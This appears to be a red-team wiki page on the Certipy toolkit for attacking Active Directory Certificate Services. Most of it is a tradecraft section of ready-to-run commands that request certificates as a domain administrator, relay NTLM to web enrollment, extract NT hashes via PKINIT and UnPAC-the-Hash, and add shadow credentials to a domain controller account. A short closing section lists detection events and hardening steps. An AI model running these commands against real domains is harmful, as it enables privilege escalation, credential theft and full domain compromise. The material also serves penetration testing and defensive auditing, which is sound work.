---
title: Certipy toolkit — ADCS attack workflow
slug: certipy-toolkit-deep
---

> **TL;DR:** Certipy is the single tool that maps Active Directory Certificate Services attack paths (ESC1–ESC16), requests certs, authenticates with them via PKINIT, and extracts NT hashes — replacing certutil + Rubeus + getnthash chains on Linux engagements.

## What it is
Certipy (`ly4k/Certipy`) is a Python toolkit that talks RPC to the CA (ICertRequestD), LDAP to the domain controller, and DCERPC over SMB. It implements every published ADCS escalation as a one-liner: enumerate templates, request certs as another principal, abuse template ACLs, relay to web enrollment, and convert TGTs to NT hashes via UnPAC-the-Hash.

## Preconditions / where it applies
- Any low-priv domain account (or anonymous if ESC8 / unauthenticated cert enrollment is on)
- Reachable CA (HTTPS / RPC) and DC (LDAP, Kerberos 88)
- Modern AD with an Enterprise CA — most corporate domains have one

## Tradecraft

Enumerate vulnerable templates first — the cornerstone of every ADCS chain:

```bash
certipy find -u low@corp.local -p 'pw' -dc-ip 10.0.0.1 -vulnerable -enabled
# Outputs JSON + text. Look for ESC1, ESC2, ESC3, ESC4, ESC6, ESC7, ESC8, ESC9, ESC10, ESC11, ESC13, ESC14, ESC15, ESC16
```

ESC1 — request a cert as a privileged user via a SAN-permissive template:

```bash
certipy req -u low@corp.local -p 'pw' -ca corp-CA01-CA -target ca01.corp.local \
  -template VulnTemplate -upn administrator@corp.local
# Produces administrator.pfx
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# Returns TGT + NT hash
```

ESC8 — HTTP NTLM relay to certsrv (chains with [[ntlm-relay]]):

```bash
# Coerce DC01 via PetitPotam in another window
certipy relay -target 'http://ca01.corp.local' -template DomainController
# When auth lands, Certipy auto-requests the cert and saves dc01.pfx
```

ESC9 / ESC10 — schannel mapping weakness (StrongCertificateBindingEnforcement disabled):

```bash
certipy req -u low@corp.local -p 'pw' -ca corp-CA01-CA -template UserAuthentication \
  -upn 'administrator' -dns dc01.corp.local
# Then auth via LDAPS schannel binding
```

ESC13 — OID group link abuse (cert template tied to a group via issuance policy):

```bash
certipy find -vulnerable -enabled | grep -i ESC13
certipy req -u low@corp.local -p 'pw' -ca corp-CA01-CA -template OIDLinkedTemplate
# Auth result includes the linked group's SID in PAC
```

ESC15 / EKUwu — request with a misissued EKU when ApplicationPolicies attribute is honored over EKU:

```bash
certipy req -u low@corp.local -p 'pw' -ca corp-CA01-CA -template WebServer \
  -application-policies '1.3.6.1.5.5.7.3.2'  # Client Authentication injected
```

ESC16 — `disable-extensions` plus SecurityExt off:

```bash
certipy req -u low@corp.local -p 'pw' -ca corp-CA01-CA -template Vuln \
  -upn administrator@corp.local -ns corp.local
```

UnPAC-the-Hash — convert PKINIT TGT to NT hash without an account password change:

```bash
certipy auth -pfx administrator.pfx -domain corp.local -username administrator
# NT hash printed; feed to [[pass-the-hash]] or impacket [[dcsync]]
```

Shadow-credentials chain — write `msDS-KeyCredentialLink` to a target object then auth via PKINIT:

```bash
certipy shadow auto -u low@corp.local -p 'pw' -account 'DC01$'
# Adds key, authenticates, prints NT hash for DC01$, restores
```

## Detection and defence
- 4886 / 4887 (cert issued) where SubjectAltName UPN ≠ requesting account — instant ESC1 signal
- 4768 (Kerberos AS) with `Certificate Issuer Name` populated, mapped to a high-priv account, sourced from a non-CA host
- ADCS event log "Certificate Services" 4887 with template marked `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
- Apply KB5014754 hardening (StrongCertificateBindingEnforcement = 2, full enforcement after Feb 2025)
- Run `certipy find -vulnerable` yourself monthly; remediate ESC1/ESC8 templates before red teamers do

## References
- [Certipy repo](https://github.com/ly4k/Certipy) — current ESC1–ESC16 implementation
- [Certified Pre-Owned (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) — foundational paper
- [Microsoft KB5014754](https://support.microsoft.com/kb/5014754) — schannel and KDC cert-mapping hardening
- [EKUwu (TrustedSec)](https://www.trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) — ESC15 disclosure

See also: [[adcs-attacks]], [[adcs-esc13-oid-group-linked]], [[adcs-esc14-altsecidentities]], [[adcs-esc15-ekuwu]], [[adcs-esc16-securityext-disabled]], [[shadow-credentials]], [[ntlm-relay]], [[ad-coercion-and-relay-matrix-2025]], [[impacket-toolkit-overview]], [[netexec-nxc-workflow]]
